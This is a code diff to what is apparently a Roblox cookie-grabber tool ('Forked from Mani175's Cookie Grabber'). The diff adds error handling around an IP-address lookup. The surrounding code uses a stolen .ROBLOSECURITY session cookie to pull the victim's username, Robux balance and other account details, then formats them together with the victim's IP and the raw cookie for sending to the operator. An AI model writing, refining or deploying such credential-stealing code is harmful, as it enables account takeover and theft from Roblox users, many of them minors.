@@ -26,11 +26,15 @@ class SMTHGRB:
         
         user = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":self.cookie}).json()
         id = user['UserID']
-
+        try:
+            ip = requests.get('https://api.ipify.org/').text
+        except:
+            ## It could not get any connection, so we just do a "N/A" Value
+            ip = "N/A"
         self.embeds.append(
             {
                 "title": f"✔ Valid Account - {self.platform}",
-                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{requests.get('https://api.ipify.org/').text}**||\n\nCookie:\n||```fix\n{self.cookie}```||",
+                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{ip}**||\n\nCookie:\n||```fix\n{self.cookie}```||",
                 "color": 12452044,
                 "footer": {
                     "text": "v2.2 ; Forked from Mani175's Cookie Grabber"
